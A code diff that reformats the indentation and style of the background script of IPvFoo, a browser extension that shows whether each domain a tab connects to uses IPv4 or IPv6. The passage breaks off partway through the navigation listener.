@@ -38,7 +38,7 @@ user can demand a popup before any IP addresses are available.
 
 // Returns an Object with no default properties.
 function newMap() {
-  return Object.create(null);
+    return Object.create(null);
 }
 
 // requestId -> {tabInfo, domain}
@@ -49,39 +49,34 @@ const tabMap = newMap();
 
 // Images from spritesXX.png: [x, y, w, h]
 const spriteBig = {
-  "4": {16: [1, 1, 9, 14],
-        32: [1, 1, 21, 28]},
-  "6": {16: [11, 1, 9, 14],
-        32: [23, 1, 21, 28]},
-  "?": {16: [21, 1, 9, 14],
-        32: [45, 1, 21, 28]},
+    "4": { 16: [1, 1, 9, 14], 32: [1, 1, 21, 28] },
+    "6": { 16: [11, 1, 9, 14], 32: [23, 1, 21, 28] },
+    "?": { 16: [21, 1, 9, 14], 32: [45, 1, 21, 28] },
 };
 const spriteSmall = {
-  "4": {16: [31, 1, 6, 6],
-        32: [67, 1, 10, 10]},
-  "6": {16: [31, 8, 6, 6],
-        32: [67, 12, 10, 10]},
+    "4": { 16: [31, 1, 6, 6], 32: [67, 1, 10, 10] },
+    "6": { 16: [31, 8, 6, 6], 32: [67, 12, 10, 10] },
 };
 
 // Destination coordinates: [x, y]
 const targetBig = {
-  16: [0, 1],
-  32: [0, 2],
+    16: [0, 1],
+    32: [0, 2],
 };
 const targetSmall1 = {
-  16: [10, 1],
-  32: [22, 2],
+    16: [10, 1],
+    32: [22, 2],
 };
 const targetSmall2 = {
-  16: [10, 8],
-  32: [22, 14],
+    16: [10, 8],
+    32: [22, 14],
 };
 
 // Possible states for an instance of TabInfo.
 // We begin at BIRTH, and only ever move forward, not backward.
-const TAB_BIRTH = 0;    // Waiting for TabTracker onConnect
-const TAB_ALIVE = 1;    // Waiting for TabTracker onDisconnect
-const TAB_DELETED = 2;  // Dead.
+const TAB_BIRTH = 0; // Waiting for TabTracker onConnect
+const TAB_ALIVE = 1; // Waiting for TabTracker onDisconnect
+const TAB_DELETED = 2; // Dead.
 
 // RequestFilter for webRequest events.
 const FILTER_ALL_URLS = { urls: ["<all_urls>"] };
@@ -94,327 +89,333 @@ const DNS_CHARS = /^[0-9A-Za-z._-]+$/;
 // Executing this inline ensures that the images load before
 // firing the onload handler.
 function loadSpriteImg(size) {
-  const s = document.createElement("img");
-  s.src = "sprites" + size + ".png";
-  return s;
+    const s = document.createElement("img");
+    s.src = "sprites" + size + ".png";
+    return s;
 }
 const spriteImg = {
-  16: loadSpriteImg(16),
-  32: loadSpriteImg(32),
+    16: loadSpriteImg(16),
+    32: loadSpriteImg(32),
 };
 
 // Get a <canvas> element of the given size.  We could get away with just one,
 // but seeing them side-by-side helps with multi-DPI debugging.
 const canvasElements = newMap();
 function getCanvasContext(size) {
-  let c = canvasElements[size];
-  if (!c) {
-    c = canvasElements[size] = document.createElement("canvas");
-    c.width = c.height = size;
-    document.body.appendChild(c);
-  }
-  return c.getContext("2d");
+    let c = canvasElements[size];
+    if (!c) {
+        c = canvasElements[size] = document.createElement("canvas");
+        c.width = c.height = size;
+        document.body.appendChild(c);
+    }
+    return c.getContext("2d");
 }
 
 // pattern is 0..3 characters, each '4', '6', or '?'.
 // size is 16 or 32.
 // color is "lightfg" or "darkfg".
 function buildIcon(pattern, size, color) {
-  const ctx = getCanvasContext(size);
-  ctx.clearRect(0, 0, size, size);
-  if (pattern.length >= 1) {
-    drawSprite(ctx, size, targetBig, spriteBig[pattern.charAt(0)]);
-  }
-  if (pattern.length >= 2) {
-    drawSprite(ctx, size, targetSmall1, spriteSmall[pattern.charAt(1)]);
-  }
-  if (pattern.length >= 3) {
-    drawSprite(ctx, size, targetSmall2, spriteSmall[pattern.charAt(2)]);
-  }
-  const imageData = ctx.getImageData(0, 0, size, size);
-  if (color == "lightfg") {
-    // Apply the light foreground color.
-    const px = imageData.data;
-    const floor = 128;
-    for (var i = 0; i < px.length; i += 4) {
-      px[i+0] += floor;
-      px[i+1] += floor;
-      px[i+2] += floor;
+    const ctx = getCanvasContext(size);
+    ctx.clearRect(0, 0, size, size);
+    if (pattern.length >= 1) {
+        drawSprite(ctx, size, targetBig, spriteBig[pattern.charAt(0)]);
     }
-  }
-  return imageData;
+    if (pattern.length >= 2) {
+        drawSprite(ctx, size, targetSmall1, spriteSmall[pattern.charAt(1)]);
+    }
+    if (pattern.length >= 3) {
+        drawSprite(ctx, size, targetSmall2, spriteSmall[pattern.charAt(2)]);
+    }
+    const imageData = ctx.getImageData(0, 0, size, size);
+    if (color == "lightfg") {
+        // Apply the light foreground color.
+        const px = imageData.data;
+        const floor = 128;
+        for (var i = 0; i < px.length; i += 4) {
+            px[i + 0] += floor;
+            px[i + 1] += floor;
+            px[i + 2] += floor;
+        }
+    }
+    return imageData;
 }
 
 function drawSprite(ctx, size, targets, sources) {
-  const source = sources[size];
-  const target = targets[size];
-  // (image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight)
-  ctx.drawImage(spriteImg[size],
-                source[0], source[1], source[2], source[3],
-                target[0], target[1], source[2], source[3]);
+    const source = sources[size];
+    const target = targets[size];
+    // (image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight)
+    ctx.drawImage(spriteImg[size], source[0], source[1], source[2], source[3], target[0], target[1], source[2], source[3]);
 }
 
 // In theory, we should be using a full-blown subnet parser/matcher here,
 // but let's keep it simple and stick with text for now.
 function addrToVersion(addr) {
-  if (addr) {
-    if (/^64:ff9b::/.test(addr)) return "4";  // RFC6052
-    if (addr.indexOf(".") >= 0) return "4";
-    if (addr.indexOf(":") >= 0) return "6";
-  }
-  return "?";
+    if (addr) {
+        if (/^64:ff9b::/.test(addr)) return "4"; // RFC6052
+        if (addr.indexOf(".") >= 0) return "4";
+        if (addr.indexOf(":") >= 0) return "6";
+    }
+    return "?";
 }
 
 function parseUrl(url) {
-  let domain = null;
-  let ssl = false;
-  let ws = false;
+    let domain = null;
+    let ssl = false;
+    let ws = false;
 
-  const a = document.createElement("a");
-  a.href = url;
-  if (a.protocol == "file:") {
-    domain = "file://";
-  } else if (a.protocol == "chrome:") {
-    domain = "chrome://";
-  } else {
-    domain = a.hostname || "";
-    switch (a.protocol) {
-      case "https:":
-        ssl = true;
-        break;
-      case "wss:":
-        ssl = true;
-        // fallthrough
-      case "ws:":
-        ws = true;
-        break;
+    const a = document.createElement("a");
+    a.href = url;
+    if (a.protocol == "file:") {
+        domain = "file://";
+    } else if (a.protocol == "chrome:") {
+        domain = "chrome://";
+    } else {
+        domain = a.hostname || "";
+        switch (a.protocol) {
+            case "https:":
+                ssl = true;
+                break;
+            case "wss:":
+                ssl = true;
+            // fallthrough
+            case "ws:":
+                ws = true;
+                break;
+        }
     }
-  }
-  return { domain: domain, ssl: ssl, ws: ws, origin: a.origin };
+    return { domain: domain, ssl: ssl, ws: ws, origin: a.origin };
 }
 
 // -- TabInfo --
 
 const TabInfo = function(tabId) {
-  this.tabId = tabId;
-  this.state = TAB_BIRTH;     // See the TAB_* constants above.
-  this.mainDomain = "";       // Bare domain from the main_frame request.
-  this.mainOrigin = "";       // Origin from the main_frame request.
-  this.dataExists = false;    // True if we have data to publish.
-  this.committed = false;     // True if onCommitted has fired.
-  this.domains = newMap();    // Updated whenever we get some IPs.
-  this.spillCount = 0;        // How many requests didn't fit in domains.
-  this.lastPattern = "";      // To avoid redundant icon redraws.
-  this.lastTooltip = "";      // To avoid redundant tooltip updates.
-  this.accessDenied = false;  // webRequest events aren't permitted.
-  this.color = "regularColorScheme";  // ... or incognitoColorScheme.
+    this.tabId = tabId;
+    this.state = TAB_BIRTH; // See the TAB_* constants above.
+    this.mainDomain = ""; // Bare domain from the main_frame request.
+    this.mainOrigin = ""; // Origin from the main_frame request.
+    this.dataExists = false; // True if we have data to publish.
+    this.committed = false; // True if onCommitted has fired.
+    this.domains = newMap(); // Updated whenever we get some IPs.
+    this.spillCount = 0; // How many requests didn't fit in domains.
+    this.lastPattern = ""; // To avoid redundant icon redraws.
+    this.lastTooltip = ""; // To avoid redundant tooltip updates.
+    this.accessDenied = false; // webRequest events aren't permitted.
+    this.color = "regularColorScheme"; // ... or incognitoColorScheme.
 
-  // First, clean up the previous TabInfo, if any.
-  tabTracker.disconnect(tabId);
-  if (tabMap[tabId]) throw "Duplicate entry in tabMap";
-  tabMap[tabId] = this;
+    // First, clean up the previous TabInfo, if any.
+    tabTracker.disconnect(tabId);
+    if (tabMap[tabId]) throw "Duplicate entry in tabMap";
+    tabMap[tabId] = this;
 
-  // Start polling for the tab's existence.
-  const that = this;
-  tabTracker.connect(tabId, function() {
-    // onConnect: Yay, the tab exists; maybe give it an icon.
-    if (that.state != TAB_BIRTH) throw "Unexpected onConnect!";
-    that.state = TAB_ALIVE;
-    that.updateIcon();
-  }, function() {
-    // onDisconnect: Tell in-flight requests/timeouts to ignore this instance.
-    if (that.state == TAB_DELETED) throw "Redundant onDisconnect!";
-    that.state = TAB_DELETED;
-    delete tabMap[that.tabId];
-  });
+    // Start polling for the tab's existence.
+    const that = this;
+    tabTracker.connect(
+        tabId,
+        function() {
+            // onConnect: Yay, the tab exists; maybe give it an icon.
+            if (that.state != TAB_BIRTH) throw "Unexpected onConnect!";
+            that.state = TAB_ALIVE;
+            that.updateIcon();
+        },
+        function() {
+            // onDisconnect: Tell in-flight requests/timeouts to ignore this instance.
+            if (that.state == TAB_DELETED) throw "Redundant onDisconnect!";
+            that.state = TAB_DELETED;
+            delete tabMap[that.tabId];
+        }
+    );
 };
 
 TabInfo.prototype.setInitialDomain = function(domain, origin) {
-  this.mainDomain = domain;
-  this.mainOrigin = origin;
+    this.mainDomain = domain;
+    this.mainOrigin = origin;
 
-  // If anyone's watching, show some preliminary state.
-  popups.pushAll(this.tabId);
+    // If anyone's watching, show some preliminary state.
+    popups.pushAll(this.tabId);
 };
 
 TabInfo.prototype.setCommitted = function(domain, origin) {
-  if (this.state == TAB_DELETED) throw "Impossible";
+    if (this.state == TAB_DELETED) throw "Impossible";
 
-  const oldState = [this.accessDenied, this.mainDomain];
+    const oldState = [this.accessDenied, this.mainDomain];
 
-  if (origin != this.mainOrigin) {
-    // We never saw a main_frame webRequest for this page, so it must've
-    // been blocked by some policy.  Wipe all the state to avoid reporting
-    // misleading information.  Known cases where this can occur:
-    // - chrome:// URLs
-    // - file:// URLs (when "allow" is unchecked)
-    // - Pages in the Chrome Web Store
-    this.domains = newMap();
-    this.spillCount = 0;
-    this.accessDenied = true;
-  }
+    if (origin != this.mainOrigin) {
+        // We never saw a main_frame webRequest for this page, so it must've
+        // been blocked by some policy.  Wipe all the state to avoid reporting
+        // misleading information.  Known cases where this can occur:
+        // - chrome:// URLs
+        // - file:// URLs (when "allow" is unchecked)
+        // - Pages in the Chrome Web Store
+        this.domains = newMap();
+        this.spillCount = 0;
+        this.accessDenied = true;
+    }
 
-  this.mainDomain = domain;
-  this.dataExists = true;
-  this.committed = true;
+    this.mainDomain = domain;
+    this.dataExists = true;
+    this.committed = true;
 
-  // This is usually redundant, but lastPattern takes care of it.
-  this.updateIcon();
+    // This is usually redundant, but lastPattern takes care of it.
+    this.updateIcon();
 
-  // If the table contents changed, then redraw it.
-  const newState = [this.accessDenied, this.mainDomain];
-  if (oldState.toString() != newState.toString()) {
-    popups.pushAll(this.tabId);
-  }
+    // If the table contents changed, then redraw it.
+    const newState = [this.accessDenied, this.mainDomain];
+    if (oldState.toString() != newState.toString()) {
+        popups.pushAll(this.tabId);
+    }
 };
 
 // If the pageAction is supposed to be visible now, then draw it again.
 TabInfo.prototype.refreshPageAction = function() {
-  this.lastPattern = "";
-  this.lastTooltip = "";
-  this.updateIcon();
+    this.lastPattern = "";
+    this.lastTooltip = "";
+    this.updateIcon();
 };
 
 TabInfo.prototype.addDomain = function(domain, addr, flags) {
-  if (this.state == TAB_DELETED) throw "Impossible";
+    if (this.state == TAB_DELETED) throw "Impossible";
 
-  const oldDomainInfo = this.domains[domain];
-  let connCount = null;
-  flags |= FLAG_CONNECTED;
+    const oldDomainInfo = this.domains[domain];
+    let connCount = null;
+    flags |= FLAG_CONNECTED;
 
-  if (!oldDomainInfo) {
-    // Limit the number of domains per page, to avoid wasting RAM.
-    if (Object.keys(this.domains).length >= 256) {
-      popups.pushSpillCount(this.tabId, ++this.spillCount);
-      return;
+    if (!oldDomainInfo) {
+        // Limit the number of domains per page, to avoid wasting RAM.
+        if (Object.keys(this.domains).length >= 256) {
+            popups.pushSpillCount(this.tabId, ++this.spillCount);
+            return;
+        }
+        // Run this after the last connection goes away.
+        const that = this;
+        connCount = new ConnectionCounter(function() {
+            if (that.state == TAB_DELETED) {
+                return;
+            }
+            const d = that.domains[domain];
+            if (d) {
+                d.flags &= ~FLAG_CONNECTED;
+                popups.pushOne(that.tabId, domain, d.addr, d.flags);
+            }
+        });
+        connCount.up();
+    } else {
+        connCount = oldDomainInfo.connCount;
+        connCount.up();
+        // Don't allow a cached IP to overwrite an actually-connected IP.
+        if (!(flags & FLAG_UNCACHED) && oldDomainInfo.flags & FLAG_UNCACHED) {
+            addr = oldDomainInfo.addr;
+        }
+        // Merge in the previous flags.
+        flags |= oldDomainInfo.flags;
+        // Don't update if nothing has changed.
+        if (oldDomainInfo.addr == addr && oldDomainInfo.flags == flags) {
+            return;
+        }
     }
-    // Run this after the last connection goes away.
-    const that = this;
-    connCount = new ConnectionCounter(function() {
-      if (that.state == TAB_DELETED) {
-        return;
-      }
-      const d = that.domains[domain];
-      if (d) {
-        d.flags &= ~FLAG_CONNECTED;
-        popups.pushOne(that.tabId, domain, d.addr, d.flags);
-      }
-    });
-    connCount.up();
-  } else {
-    connCount = oldDomainInfo.connCount;
-    connCount.up();
-    // Don't allow a cached IP to overwrite an actually-connected IP.
-    if (!(flags & FLAG_UNCACHED) && (oldDomainInfo.flags & FLAG_UNCACHED)) {
-      addr = oldDomainInfo.addr;
-    }
-    // Merge in the previous flags.
-    flags |= oldDomainInfo.flags;
-    // Don't update if nothing has changed.
-    if (oldDomainInfo.addr == addr && oldDomainInfo.flags == flags) {
-      return;
-    }
-  }
 
-  this.domains[domain] = {
-    addr: addr,
-    flags: flags,
-    connCount: connCount,
-  };
-  this.dataExists = true;
+    this.domains[domain] = {
+        addr: addr,
+        flags: flags,
+        connCount: connCount,
+    };
+    this.dataExists = true;
 
-  this.updateIcon();
-  popups.pushOne(this.tabId, domain, addr, flags);
+    this.updateIcon();
+    popups.pushOne(this.tabId, domain, addr, flags);
 };
 
 TabInfo.prototype.disconnectDomain = function(domain) {
-  const d = this.domains[domain];
-  if (d) {
-    d.connCount.down();
-  }
+    const d = this.domains[domain];
+    if (d) {
+        d.connCount.down();
+    }
 };
 
 TabInfo.prototype.updateIcon = function() {
-  if (!(this.state == TAB_ALIVE && this.dataExists)) {
-    return;
-  }
-  const domains = Object.keys(this.domains);
-  let pattern = "?";
-  let has4 = false;
-  let has6 = false;
-  let tooltip = "";
-  for (const domain of domains) {
-    const addr = this.domains[domain].addr;
-    const version = addrToVersion(addr);
-    if (domain == this.mainDomain) {
-      pattern = version;
-      tooltip = addr + " - IPvFoo";
-    } else {
-      switch (version) {
-        case "4": has4 = true; break;
-        case "6": has6 = true; break;
-      }
+    if (!(this.state == TAB_ALIVE && this.dataExists)) {
+        return;
     }
-  }
-  if (has4) pattern += "4";
-  if (has6) pattern += "6";
+    const domains = Object.keys(this.domains);
+    let pattern = "?";
+    let has4 = false;
+    let has6 = false;
+    let tooltip = "";
+    for (const domain of domains) {
+        const addr = this.domains[domain].addr;
+        const version = addrToVersion(addr);
+        if (domain == this.mainDomain) {
+            pattern = version;
+            tooltip = addr + " - IPvFoo";
+        } else {
+            switch (version) {
+                case "4":
+                    has4 = true;
+                    break;
+                case "6":
+                    has6 = true;
+                    break;
+            }
+        }
+    }
+    if (has4) pattern += "4";
+    if (has6) pattern += "6";
 
-  // Don't waste time rewriting the same tooltip.
-  if (this.lastTooltip != tooltip) {
-    chrome.pageAction.setTitle({
-      "tabId": this.tabId,
-      "title": tooltip,
+    // Don't waste time rewriting the same tooltip.
+    if (this.lastTooltip != tooltip) {
+        chrome.pageAction.setTitle({
+            tabId: this.tabId,
+            title: tooltip,
+        });
+        this.lastTooltip = tooltip;
+    }
+
+    // Don't waste time redrawing the same icon.
+    if (this.lastPattern == pattern) {
+        return;
+    }
+    this.lastPattern = pattern;
+
+    const color = options[this.color];
+    chrome.pageAction.setIcon({
+        tabId: this.tabId,
+        imageData: {
+            // Note: It might be possible to avoid redundant operations by reading
+            //       window.devicePixelRatio
+            "16": buildIcon(pattern, 16, color),
+            "32": buildIcon(pattern, 32, color),
+        },
     });
-    this.lastTooltip = tooltip;
-  }
-
-  // Don't waste time redrawing the same icon.
-  if (this.lastPattern == pattern) {
-    return;
-  }
-  this.lastPattern = pattern;
-
-  const color = options[this.color];
-  chrome.pageAction.setIcon({
-    "tabId": this.tabId,
-    "imageData": {
-      // Note: It might be possible to avoid redundant operations by reading
-      //       window.devicePixelRatio
-      "16": buildIcon(pattern, 16, color),
-      "32": buildIcon(pattern, 32, color),
-    },
-  });
-  chrome.pageAction.setPopup({
-    "tabId": this.tabId,
-    "popup": "popup.html#" + this.tabId,
-  });
-  chrome.pageAction.show(this.tabId);
+    chrome.pageAction.setPopup({
+        tabId: this.tabId,
+        popup: "popup.html#" + this.tabId,
+    });
+    chrome.pageAction.show(this.tabId);
 };
 
 // Build some [domain, addr, version, flags] tuples, for a popup.
 TabInfo.prototype.getTuples = function() {
-  if (this.state == TAB_DELETED) throw "Impossible";
+    if (this.state == TAB_DELETED) throw "Impossible";
 
-  const mainDomain = this.mainDomain || "---";
-  if (this.accessDenied) {
-    return [[mainDomain, "(access denied)", "?", FLAG_UNCACHED]];
-  }
-  const domains = Object.keys(this.domains).sort();
-  const mainTuple = [mainDomain, "(no address)", "?", 0];
-  const tuples = [mainTuple];
-  for (const domain of domains) {
-    const addr = this.domains[domain].addr;
-    const version = addrToVersion(addr);
-    const flags = this.domains[domain].flags;
-    if (domain == mainTuple[0]) {
-      mainTuple[1] = addr;
-      mainTuple[2] = version;
-      mainTuple[3] = flags;
-    } else {
-      tuples.push([domain, addr, version, flags]);
+    const mainDomain = this.mainDomain || "---";
+    if (this.accessDenied) {
+        return [[mainDomain, "(access denied)", "?", FLAG_UNCACHED]];
     }
-  }
-  return tuples;
+    const domains = Object.keys(this.domains).sort();
+    const mainTuple = [mainDomain, "(no address)", "?", 0];
+    const tuples = [mainTuple];
+    for (const domain of domains) {
+        const addr = this.domains[domain].addr;
+        const version = addrToVersion(addr);
+        const flags = this.domains[domain].flags;
+        if (domain == mainTuple[0]) {
+            mainTuple[1] = addr;
+            mainTuple[2] = version;
+            mainTuple[3] = flags;
+        } else {
+            tuples.push([domain, addr, version, flags]);
+        }
+    }
+    return tuples;
 };
 
 // -- ConnectionCounter --
@@ -423,28 +424,28 @@ TabInfo.prototype.getTuples = function() {
 // the highlight from the popup.  The timer enforces a minimum hold time.
 
 const ConnectionCounter = function(onZero) {
-  this.onZero = onZero;
-  this.count = 0;
-  this.timer = null;
+    this.onZero = onZero;
+    this.count = 0;
+    this.timer = null;
 };
 
 ConnectionCounter.prototype.up = function() {
-  const that = this;
-  if (++that.count == 1 && !that.timer) {
-    that.timer = setTimeout(function() {
-      that.timer = null;
-      if (that.count == 0) {
-        that.onZero();
-      }
-    }, 500);
-  }
+    const that = this;
+    if (++that.count == 1 && !that.timer) {
+        that.timer = setTimeout(function() {
+            that.timer = null;
+            if (that.count == 0) {
+                that.onZero();
+            }
+        }, 500);
+    }
 };
 
 ConnectionCounter.prototype.down = function() {
-  if (!(this.count > 0)) throw "Count went negative!";
-  if (--this.count == 0 && !this.timer) {
-    this.onZero();
-  }
+    if (!(this.count > 0)) throw "Count went negative!";
+    if (--this.count == 0 && !this.timer) {
+        this.onZero();
+    }
 };
 
 // -- Popups --
@@ -452,77 +453,77 @@ ConnectionCounter.prototype.down = function() {
 // This class keeps track of the visible popup windows,
 // and streams changes to them as they occur.
 const Popups = function() {
-  this.map = newMap();      // tabId -> popup window
-  this.hasTimeout = false;  // Is the GC scheduled?
+    this.map = newMap(); // tabId -> popup window
+    this.hasTimeout = false; // Is the GC scheduled?
 };
 
 // Attach a new popup window, and start sending it updates.
 Popups.prototype.attachWindow = function(win) {
-  this.map[win.tabId] = win;
-  this.pushAll(win.tabId);
-  this.garbageCollect();
+    this.map[win.tabId] = win;
+    this.pushAll(win.tabId);
+    this.garbageCollect();
 };
 
 // Periodically make sure this.map is a subset of the visible popups.
 Popups.prototype.garbageCollect = function() {
-  if (this.hasTimeout) {
-    return;
-  }
-  if (Object.keys(this.map).length == 0) {
-    return;
-  }
-  this.hasTimeout = true;
-  const that = this;
-  setTimeout(function() {
-    // Find all the tabs with active popups.
-    const popupTabs = newMap();
-    const popups = chrome.extension.getViews({type:"popup"});
-    for (const popup of popups) {
-      popupTabs[popup.tabId] = true;
+    if (this.hasTimeout) {
+        return;
     }
-
-    // Drop references to the inactive popups.
-    const storedTabs = Object.keys(that.map);
-    for (const tabId of storedTabs) {
-      if (!popupTabs[tabId]) {
-        delete that.map[tabId];
-      }
+    if (Object.keys(this.map).length == 0) {
+        return;
     }
+    this.hasTimeout = true;
+    const that = this;
+    setTimeout(function() {
+        // Find all the tabs with active popups.
+        const popupTabs = newMap();
+        const popups = chrome.extension.getViews({ type: "popup" });
+        for (const popup of popups) {
+            popupTabs[popup.tabId] = true;
+        }
 
-    // Maybe schedule another run.
-    that.hasTimeout = false;
-    that.garbageCollect();
-  }, 5000);
+        // Drop references to the inactive popups.
+        const storedTabs = Object.keys(that.map);
+        for (const tabId of storedTabs) {
+            if (!popupTabs[tabId]) {
+                delete that.map[tabId];
+            }
+        }
+
+        // Maybe schedule another run.
+        that.hasTimeout = false;
+        that.garbageCollect();
+    }, 5000);
 };
 
 Popups.prototype.pushAll = function(tabId) {
-  const win = this.map[tabId];
-  const tabInfo = tabMap[tabId];
-  if (win && tabInfo) {
-    win.pushAll(tabInfo.getTuples(), tabInfo.spillCount);
-  }
+    const win = this.map[tabId];
+    const tabInfo = tabMap[tabId];
+    if (win && tabInfo) {
+        win.pushAll(tabInfo.getTuples(), tabInfo.spillCount);
+    }
 };
 
 Popups.prototype.pushOne = function(tabId, domain, addr, flags) {
-  const win = this.map[tabId];
-  if (win) {
-    win.pushOne([domain, addr, addrToVersion(addr), flags]);
-  }
+    const win = this.map[tabId];
+    if (win) {
+        win.pushOne([domain, addr, addrToVersion(addr), flags]);
+    }
 };
 
 Popups.prototype.pushSpillCount = function(tabId, count) {
-  const win = this.map[tabId];
-  if (win) {
-    win.pushSpillCount(count);
-  }
+    const win = this.map[tabId];
+    if (win) {
+        win.pushSpillCount(count);
+    }
 };
 
 Popups.prototype.shake = function(tabId) {
-  const win = this.map[tabId];
-  if (win) {
-    win.shake();
-  }
-}
+    const win = this.map[tabId];
+    if (win) {
+        win.shake();
+    }
+};
 
 window.popups = new Popups();
 
@@ -541,23 +542,23 @@ window.popups = new Popups();
 // Once a tab has become visible, then hopefully we can rely on the onRemoved
 // event to fire sometime in the future, when the user closes it.
 const TabTracker = function() {
-  this.tabSet = newMap();               // Set of all known tabIds
-  this.timers = newMap();               // tabId -> clearTimeout key
-  this.connectCallbacks = newMap();     // tabId -> onConnect callback
-  this.disconnectCallbacks = newMap();  // tabId -> onDisconnect callback
+    this.tabSet = newMap(); // Set of all known tabIds
+    this.timers = newMap(); // tabId -> clearTimeout key
+    this.connectCallbacks = newMap(); // tabId -> onConnect callback
+    this.disconnectCallbacks = newMap(); // tabId -> onDisconnect callback
 
-  const that = this;
-  chrome.tabs.onCreated.addListener(function(tab) {
-    that.addTab_(tab.id, "onCreated");
-  });
-  chrome.tabs.onRemoved.addListener(function(tabId) {
-    that.removeTab_(tabId, "onRemoved");
-  });
-  chrome.tabs.onReplaced.addListener(function(addId, removeId) {
-    that.removeTab_(removeId, "onReplaced");
-    that.addTab_(addId, "onReplaced");
-  });
-  this.pollAllTabs_();
+    const that = this;
+    chrome.tabs.onCreated.addListener(function(tab) {
+        that.addTab_(tab.id, "onCreated");
+    });
+    chrome.tabs.onRemoved.addListener(function(tabId) {
+        that.removeTab_(tabId, "onRemoved");
+    });
+    chrome.tabs.onReplaced.addListener(function(addId, removeId) {
+        that.removeTab_(removeId, "onReplaced");
+        that.addTab_(addId, "onReplaced");
+    });
+    this.pollAllTabs_();
 };
 
 // Begin watching this tabId.  If the tab exists, then onConnect fires
@@ -565,64 +566,63 @@ const TabTracker = function() {
 // failure.  After a successful connection, onDisconnect fires when the tab
 // finally does go away.
 TabTracker.prototype.connect = function(tabId, onConnect, onDisconnect) {
-  if (tabId in this.timers ||
-      tabId in this.connectCallbacks ||
-      tabId in this.disconnectCallbacks) {
-    throw "Duplicate connection: " + tabId;
-  }
-  this.connectCallbacks[tabId] = onConnect;
-  this.disconnectCallbacks[tabId] = onDisconnect;
-  if (tabId in this.tabSet) {
-    // Connect immediately.
-    this.finishConnect_(tabId);
-  } else {
-    // Disconnect if the tab doesn't appear within 30 seconds.
-    const that = this;
-    this.timers[tabId] = setTimeout(function() {
-      that.disconnect(tabId);
-    }, 30000);
-  }
+    if (tabId in this.timers || tabId in this.connectCallbacks || tabId in this.disconnectCallbacks) {
+        throw "Duplicate connection: " + tabId;
+    }
+    this.connectCallbacks[tabId] = onConnect;
+    this.disconnectCallbacks[tabId] = onDisconnect;
+    if (tabId in this.tabSet) {
+        // Connect immediately.
+        this.finishConnect_(tabId);
+    } else {
+        // Disconnect if the tab doesn't appear within 30 seconds.
+        const that = this;
+        this.timers[tabId] = setTimeout(function() {
+            that.disconnect(tabId);
+        }, 30000);
+    }
 };
 
 // If a watcher is bound to this tabId, then disconnect it.
 TabTracker.prototype.disconnect = function(tabId) {
-  const timer = this.timers[tabId];
-  const onDisconnect = this.disconnectCallbacks[tabId];
-  delete this.timers[tabId];
-  delete this.connectCallbacks[tabId];
-  delete this.disconnectCallbacks[tabId];
-  if (timer) {
-    clearTimeout(timer);
-  }
-  if (onDisconnect) {
-    onDisconnect();
-  }
+    const timer = this.timers[tabId];
+    const onDisconnect = this.disconnectCallbacks[tabId];
+    delete this.timers[tabId];
+    delete this.connectCallbacks[tabId];
+    delete this.disconnectCallbacks[tabId];
+    if (timer) {
+        clearTimeout(timer);
+    }
+    if (onDisconnect) {
+        onDisconnect();
+    }
 };
 
 // If a watcher is waiting for this tabId, then connect it.
 TabTracker.prototype.finishConnect_ = function(tabId) {
-  const timer = this.timers[tabId];
-  const onConnect = this.connectCallbacks[tabId];
-  delete this.timers[tabId];
-  delete this.connectCallbacks[tabId];
-  if (timer) {
-    clearTimeout(timer);
-  }
-  if (onConnect) {
-    if (!this.disconnectCallbacks[tabId]) {
-      throw "onConnect requires an onDisconnect!";
+    const timer = this.timers[tabId];
+    const onConnect = this.connectCallbacks[tabId];
+    delete this.timers[tabId];
+    delete this.connectCallbacks[tabId];
+    if (timer) {
+        clearTimeout(timer);
     }
-    onConnect();
-  }
+    if (onConnect) {
+        if (!this.disconnectCallbacks[tabId]) {
+            throw "onConnect requires an onDisconnect!";
+        }
+        onConnect();
+    }
 };
 
 // Given two set-like objects, return "a - b".
 function subtractSets(a, b) {
-  const out = [];
-  for (x in a) if (!(x in b)) {
-    out.push(x);
-  }
-  return out;
+    const out = [];
+    for (x in a)
+        if (!(x in b)) {
+            out.push(x);
+        }
+    return out;
 }
 
 // Get the set of all known tabs, and synchronize our state by calling
@@ -630,36 +630,38 @@ function subtractSets(a, b) {
 // become a no-op, provided that the events are all firing as expected.
 // But just in case, repeat every few minutes to check for garbage.
 TabTracker.prototype.pollAllTabs_ = function() {
-  const that = this;
-  chrome.tabs.query({}, function(result) {
-    const newTabSet = newMap();
-    for (const r of result) {
-      newTabSet[r.id] = true;
-    }
-    const toAdd = subtractSets(newTabSet, that.tabSet);
-    const toRemove = subtractSets(that.tabSet, newTabSet);
-    for (const id of toAdd) {
-      that.addTab_(id, "pollAllTabs_");
-    }
-    for (const id of toRemove) {
-      console.log("Removing garbage tab: " + id);
-      that.removeTab_(id, "pollAllTabs_");
-    }
-    // Check again in 5 minutes.
-    setTimeout(function() { that.pollAllTabs_() }, 5 * 60000);
-  });
+    const that = this;
+    chrome.tabs.query({}, function(result) {
+        const newTabSet = newMap();
+        for (const r of result) {
+            newTabSet[r.id] = true;
+        }
+        const toAdd = subtractSets(newTabSet, that.tabSet);
+        const toRemove = subtractSets(that.tabSet, newTabSet);
+        for (const id of toAdd) {
+            that.addTab_(id, "pollAllTabs_");
+        }
+        for (const id of toRemove) {
+            console.log("Removing garbage tab: " + id);
+            that.removeTab_(id, "pollAllTabs_");
+        }
+        // Check again in 5 minutes.
+        setTimeout(function() {
+            that.pollAllTabs_();
+        }, 5 * 60000);
+    });
 };
 
 // Record that this tabId now exists.
 TabTracker.prototype.addTab_ = function(tabId, logText) {
-  this.tabSet[tabId] = true;
-  this.finishConnect_(tabId);
+    this.tabSet[tabId] = true;
+    this.finishConnect_(tabId);
 };
 
 // Record that this tabId no longer exists.
 TabTracker.prototype.removeTab_ = function(tabId, logText) {
-  delete this.tabSet[tabId];
-  this.disconnect(tabId);
+    delete this.tabSet[tabId];
+    this.disconnect(tabId);
 };
 
 const tabTracker = new TabTracker();
@@ -667,12 +669,12 @@ const tabTracker = new TabTracker();
 // -- webNavigation --
 
 chrome.webNavigation.onCommitted.addListener(function(details) {
-  if (details.frameId != 0) {
-    return;
-  }
-  const parsed = parseUrl(details.url);
-  const tabInfo = tabMap[details.tabId] || new TabInfo(details.tabId);
-  tabInfo.setCommitted(parsed.domain, parsed.origin);
+    if (details.frameId != 0) {
+        return;
+    }
+    const parsed = parseUrl(details.url);
+    const tabInfo = tabMap[details.tabId] || new TabInfo(details.tabId);
